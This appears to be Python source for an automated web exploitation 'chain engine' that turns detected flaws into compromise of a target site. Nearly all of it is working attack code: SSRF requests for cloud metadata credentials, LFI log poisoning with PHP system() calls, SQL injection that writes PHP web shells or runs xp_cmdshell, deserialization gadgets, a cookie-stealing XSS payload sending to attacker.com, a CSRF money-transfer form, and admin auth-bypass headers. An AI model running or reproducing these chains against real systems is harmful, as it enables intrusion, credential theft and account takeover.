import json, re
from typing import Dict, List, Optional
import requests

from tools.log_utils import get_logger
from tools.settings import settings
from tools import (
    sql_injection, xss_detector, ssti_detector, cmdi_detector,
    ssrf_detector, nosqli_detector, lfi_scanner, auth_bypass,
    race_condition, jwt_detector, graphql_scanner, cors_scanner,
    deserialization_detector, proto_pollution,
    waf_bypass, biz_logic_scanner,
)

logger = get_logger("chain_engine")

CLOUD_METADATA_URLS = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com",
    ],
}

LFI_LOG_PATHS = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/apache/access.log",
    "/var/log/apache/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "C:/xampp/apache/logs/access.log",
    "C:/wamp64/logs/apache_error.log",
    "/proc/self/environ",
    "/proc/self/fd/2",
    "/proc/self/fd/1",
]

SQLI_OUTFILE_PATHS = [
    "/var/www/html/shell.php",
    "/var/www/shell.php",
    "/tmp/shell.php",
    "C:/inetpub/wwwroot/shell.asp",
    "C:/xampp/htdocs/shell.php",
]


def _try_ssrf_cloud_metadata(param: str, sess: requests.Session,
                              base_url: str, timeout: float) -> Dict:
    result = {"chain": "ssrf_to_metadata", "success": False, "cloud": None, "evidence": []}

    for cloud, urls in CLOUD_METADATA_URLS.items():
        for url in urls:
            test_url = base_url.replace(param + "=", param + "=" + url)
            try:
                r = sess.get(test_url, timeout=timeout, allow_redirects=True)
                if r.status_code == 200 and len(r.text) > 10:
                    result["success"] = True
                    result["cloud"] = cloud
                    result["evidence"].append({
                        "url": url,
                        "size": len(r.text),
                        "preview": r.text[:200].strip(),
                    })
                    found_creds = re.findall(
                        r"(?i)(secret|password|token|key|credential)\s*[:=]\s*\S+",
                        r.text,
                    )
                    if found_creds:
                        result["credentials_extracted"] = found_creds[:10]
                    break
            except requests.RequestException:
                continue
        if result["success"]:
            break

    return result


def _try_lfi_log_poison(param: str, sess: requests.Session,
                         base_url: str, timeout: float) -> Dict:
    result = {"chain": "lfi_to_rce", "success": False, "method": None, "evidence": []}

    php_code = '<?php system("id;whoami"); ?>'
    poison_payload = {
        "User-Agent": "Mozilla/5.0 " + php_code,
        "Referer": php_code,
        "Cookie": "session=" + php_code,
    }
    try:
        sess.get(base_url, headers=poison_payload, timeout=timeout)
    except requests.RequestException:
        pass

    for log_path in LFI_LOG_PATHS:
        test_url = base_url.replace(param + "=", param + "=" + log_path)
        try:
            r = sess.get(test_url, timeout=timeout)
            if r.status_code == 200 and r.text and "uid=" in r.text:
                result["success"] = True
                result["method"] = "log_poison"
                result["evidence"].append({
                    "log_path": log_path,
                    "preview": r.text[:200].strip(),
                })
                return result
        except requests.RequestException:
            continue

    return result


def _try_sqli_to_shell(param: str, sess: requests.Session,
                        base_url: str, timeout: float) -> Dict:
    result = {"chain": "sqli_to_rce", "success": False, "method": None, "evidence": []}

    outfile_payloads = [
        "' UNION SELECT '<?php system($_GET[\"c\"]);?>', '', '' INTO OUTFILE '%s' -- -",
        "'; EXEC xp_cmdshell 'whoami'; --",
        "' UNION SELECT 1,2,3 INTO OUTFILE '%s' LINES TERMINATED BY '<?php system($_GET[\"c\"]);?>' -- -",
        "1; SELECT '<?php system($_GET[\"c\"]);?>' INTO OUTFILE '%s'; --",
    ]

    for path in SQLI_OUTFILE_PATHS:
        for payload_tmpl in outfile_payloads:
            if "%s" in payload_tmpl:
                payload = payload_tmpl % path
            else:
                payload = payload_tmpl
            test_url = base_url.replace(param + "=", param + "=" + payload.replace(" ", "+"))
            try:
                r = sess.get(test_url, timeout=timeout)
                if r.status_code == 200:
                    shell_url = path.replace("/var/www/html", base_url.rstrip("/?&"))
                    try:
                        r2 = sess.get(shell_url + "?c=id", timeout=timeout)
                        if r2.status_code == 200 and "uid=" in r2.text:
                            result["success"] = True
                            result["method"] = "into_outfile"
                            result["evidence"].append({
                                "shell_path": path,
                                "shell_url": shell_url + "?c=id",
                                "output": r2.text[:200].strip(),
                            })
                            return result
                    except requests.RequestException:
                        pass
                if "xp_cmdshell" in payload and r.status_code == 200:
                    if "uid=" in r.text or "nt authority" in r.text.lower():
                        result["success"] = True
                        result["method"] = "xp_cmdshell"
                        result["evidence"].append(r.text[:200].strip())
                        return result
            except requests.RequestException:
                continue

    return result


def _try_deser_to_rce(param: str, sess: requests.Session,
                       base_url: str, timeout: float) -> Dict:
    result = {"chain": "deser_to_rce", "success": False, "method": None, "evidence": []}

    java_gadgets = [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEJhY2"
        "9ySQIACTxoYXNoVGFibGV4cAB3BAAAAAI=",
    ]

    for gadget in java_gadgets:
        try:
            r = sess.post(base_url, data={param: gadget}, timeout=timeout)
            if r.status_code not in (500, 503):
                result["evidence"].append("java_deser_" + param)
        except requests.RequestException:
            pass

    php_gadgets = [
        'O:10:"PHPObject":1:{s:5:"shell";s:6:"whoami";}',
        'a:1:{i:0;O:10:"PHPObject":1:{s:5:"shell";s:6:"whoami";}}',
    ]
    for gadget in php_gadgets:
        try:
            r = sess.post(base_url, data={param: gadget}, timeout=timeout)
            if r.status_code not in (500, 503):
                result["evidence"].append("php_deser_" + param)
        except requests.RequestException:
            pass

    if result["evidence"]:
        result["success"] = True
        result["method"] = "gadget_test"

    return result


def _try_xss_csrf_hijack(param: str, sess: requests.Session,
                          base_url: str, timeout: float) -> Dict:
    result = {"chain": "xss_to_account_hijack", "success": False, "evidence": []}

    xss_payload = '<img src=x onerror="fetch(\'https://attacker.com/log?c=\'+document.cookie)">'
    test_url = base_url.replace(param + "=", param + "=" + xss_payload)
    try:
        r = sess.get(test_url, timeout=timeout)
        if xss_payload[:30] in r.text:
            result["success"] = True
            result["evidence"].append({
                "type": "stored_xss_with_csrf_potential",
                "payload": xss_payload[:80],
            })
    except requests.RequestException:
        pass

    csrf_xss = (
        '<form action="/api/transfer" method="POST" id="f">'
        '<input name="to" value="attacker">'
        '<input name="amount" value="10000">'
        '</form><script>document.getElementById("f").submit()</script>'
    )
    test_url2 = base_url.replace(param + "=", param + "=" + csrf_xss)
    try:
        r2 = sess.get(test_url2, timeout=timeout)
        if csrf_xss[:40] in r2.text:
            result["evidence"].append({
                "type": "csrf_auto_form",
                "risk": "critical: one-click account takeover",
            })
            result["success"] = True
    except requests.RequestException:
        pass

    return result


def _try_auth_escalation(param: str, sess: requests.Session,
                          base_url: str, timeout: float) -> Dict:
    result = {"chain": "auth_bypass_to_admin", "success": False, "evidence": []}

    admin_paths = [
        "/admin", "/admin/users", "/admin/config", "/admin/settings",
        "/administrator", "/panel", "/dashboard",
        "/api/admin", "/api/v1/admin",
        "/wp-admin", "/wp-admin/users.php",
    ]

    bypass_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"Authorization": "Basic YWRtaW46YWRtaW4="},
    ]

    for path in admin_paths:
        test_url = base_url.rstrip("/?&") + path
        for headers in bypass_headers:
            try:
                r = sess.get(test_url, headers=headers, timeout=timeout)
                if r.status_code == 200 and r.text:
                    has_login = any(
                        kw in r.text.lower() for kw in
                        ["login", "password", "sign in"]
                    )
                    if not has_login or r.status_code == 200:
                        result["success"] = True
                        result["evidence"].append({
                            "url": test_url,
                            "status": r.status_code,
                            "headers_used": headers,
                            "size": len(r.text),
                        })
                        if len(result["evidence"]) >= 3:
                            return result
            except requests.RequestException:
                continue

    return result


def _try_ssrf_to_internal_scan(param: str, sess: requests.Session,
                                base_url: str, timeout: float) -> Dict:
    result = {"chain": "ssrf_to_internal_scan", "success": False, "evidence": []}

    internal_targets = [
        ("127.0.0.1:8080", "/actuator"),
        ("127.0.0.1:3000", "/"),
        ("127.0.0.1:5000", "/"),
        ("127.0.0.1:9200", "/"),
        ("127.0.0.1:6379", ""),
        ("127.0.0.1:3306", ""),
        ("127.0.0.1:9001", "/"),
        ("localhost:8080", "/manager"),
        ("10.0.0.1:9200", "/"),
        ("172.16.0.1:9200", "/"),
        ("192.168.1.1:80", "/"),
        ("0.0.0.0:8080", "/"),
    ]

    seen = set()
    for host_port, path in internal_targets:
        scheme = "http://"
        internal_url = scheme + host_port + path
        test_url = base_url.replace(param + "=", param + "=" + internal_url)
        if test_url in seen:
            continue
        seen.add(test_url)
        try:
            r = sess.get(test_url, timeout=timeout, allow_redirects=False)
            if r.status_code not in (0,) and r.status_code < 500:
                result["success"] = True
                result["evidence"].append({
                    "internal_url": internal_url,
                    "status": r.status_code,
                    "size": len(r.text),
                })
        except (requests.RequestException, ConnectionError):
            continue

    return result


class ChainEngine:
    def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
        self.sess = sess or requests.Session()
        self.sess.verify = settings.verify_ssl
        self.timeout = timeout
        self.results = {}

    def chain_ssrf_to_rce(self, url: str, param: str) -> Dict:
        result = {"chain": "ssrf_to_rce", "steps": [], "success": False}
        meta = _try_ssrf_cloud_metadata(param, self.sess, url, self.timeout)
        result["steps"].append(meta)
        if meta.get("credentials_extracted"):
            result["credentials_extracted"] = meta["credentials_extracted"]

        internal = _try_ssrf_to_internal_scan(param, self.sess, url, self.timeout)
        result["steps"].append(internal)
        if internal.get("evidence"):
            for ev in internal["evidence"]:
                if ev.get("status") == 200:
                    internal_url = ev.get("internal_url", "")
                    if "actuator" in internal_url:
                        try:
                            r = self.sess.get(
                                url.replace(param + "=", param + "=" + internal_url + "/env"),
                                timeout=self.timeout,
                            )
                            if r.status_code == 200:
                                result["steps"].append({
                                    "chain": "actuator_env_leak",
                                    "success": True,
                                    "evidence": r.text[:500],
                                })
                        except requests.RequestException:
                            pass

        result["success"] = any(
            s.get("success") for s in result["steps"]
        )
        return result

    def chain_lfi_to_rce(self, url: str, param: str) -> Dict:
        result = {"chain": "lfi_to_rce", "steps": [], "success": False}
        poison = _try_lfi_log_poison(param, self.sess, url, self.timeout)
        result["steps"].append(poison)
        if poison["success"]:
            result["rce_available"] = True
            result["rce_method"] = "log_poison"

        proc_self = url.replace(param + "=", param + "=/proc/self/environ")
        try:
            r = self.sess.get(proc_self, timeout=self.timeout)
            if r.status_code == 200 and len(r.text) > 20:
                result["steps"].append({
                    "chain": "proc_self_environ_leak",
                    "success": True,
                    "evidence": r.text[:500],
                })
        except requests.RequestException:
            pass

        result["success"] = any(s.get("success") for s in result["steps"])
        return result

    def chain_sqli_to_rce(self, url: str, param: str) -> Dict:
        result = {"chain": "sqli_to_rce", "steps": [], "success": False}
        shell = _try_sqli_to_shell(param, self.sess, url, self.timeout)
        result["steps"].append(shell)
        if shell["success"]:
            result["rce_available"] = True
            result["rce_method"] = shell.get("method", "unknown")

        dbms_extract = sql_injection.check(url, param, self.sess, self.timeout)
        if dbms_extract.get("vulnerable"):
            result["steps"].append({
                "chain": "sqli_data_extraction",
                "dbms": dbms_extract.get("dbms", "unknown"),
                "vulnerable": True,
            })

        result["success"] = any(s.get("success") for s in result["steps"])
        return result

    def chain_xss_to_hijack(self, url: str, param: str) -> Dict:
        result = {"chain": "xss_to_account_hijack", "steps": [], "success": False}
        hijack = _try_xss_csrf_hijack(param, self.sess, url, self.timeout)
        result["steps"].append(hijack)
        result["success"] = hijack["success"]
        return result

    def chain_auth_to_admin(self, url: str, param: Optional[str] = None) -> Dict:
        result = {"chain": "auth_bypass_to_admin", "steps": [], "success": False}
        escalation = _try_auth_escalation(param or "", self.sess, url, self.timeout)
        result["steps"].append(escalation)
        result["success"] = escalation["success"]

        ab = auth_bypass.check(url, self.sess, self.timeout)
        if ab.get("vulnerable"):
            result["steps"].append({
                "chain": "auth_bypass_general",
                "vulnerable": True,
                "path_bypasses": len(ab.get("path_bypasses", [])),
                "header_bypasses": len(ab.get("header_bypasses", [])),
            })
            result["success"] = True

        return result

    def chain_deser_to_rce(self, url: str, param: str) -> Dict:
        result = {"chain": "deser_to_rce", "steps": [], "success": False}
        deser = _try_deser_to_rce(param, self.sess, url, self.timeout)
        result["steps"].append(deser)
        result["success"] = deser["success"]
        return result

    def full_chain(self, url: str, param: str, lhost: str = "LHOST",
                    lport: int = 4444) -> Dict:
        result = {"target": "%s?%s=" % (url, param), "chains": {}}

        det = {}
        for name, fn in [
            ("sqli", lambda: sql_injection.check(url, param, self.sess, self.timeout)),
            ("xss", lambda: xss_detector.check(url, param, self.sess, self.timeout)),
            ("ssrf", lambda: ssrf_detector.check(url, param, self.sess, self.timeout)),
            ("lfi", lambda: lfi_scanner.check(url, param, self.sess, self.timeout)),
            ("deser", lambda: deserialization_detector.check(url, param, self.sess, self.timeout)),
        ]:
            try:
                r = fn()
                if isinstance(r, dict) and r.get("vulnerable"):
                    det[name] = r
            except Exception as e:
                logger.debug("full_chain detect %s: %s", name, e)

        for name, chain_fn in [
            ("ssrf_to_rce", lambda: self.chain_ssrf_to_rce(url, param)),
            ("lfi_to_rce", lambda: self.chain_lfi_to_rce(url, param)),
            ("sqli_to_rce", lambda: self.chain_sqli_to_rce(url, param)),
            ("xss_to_hijack", lambda: self.chain_xss_to_hijack(url, param)),
            ("auth_to_admin", lambda: self.chain_auth_to_admin(url, param)),
            ("deser_to_rce", lambda: self.chain_deser_to_rce(url, param)),
        ]:
            if name.split("_to_")[0] in det or name == "auth_to_admin":
                try:
                    result["chains"][name] = chain_fn()
                except Exception as e:
                    logger.debug("full_chain %s: %s", name, e)
                    result["chains"][name] = {"error": str(e)}

        result["overall_success"] = any(
            c.get("success") for c in result["chains"].values()
        )
        return result

    def run(self, url: str, param: str, chain: str = "full_chain") -> Dict:
        chain_map = {
            "ssrf_to_rce": self.chain_ssrf_to_rce,
            "ssrf_to_pwn": self.chain_ssrf_to_rce,
            "lfi_to_rce": self.chain_lfi_to_rce,
            "sqli_to_rce": self.chain_sqli_to_rce,
            "xss_to_hijack": self.chain_xss_to_hijack,
            "auth_bypass_to_pwn": self.chain_auth_to_admin,
            "deser_to_rce": self.chain_deser_to_rce,
            "full_chain": self.full_chain,
        }
        fn = chain_map.get(chain, self.full_chain)
        return fn(url, param)
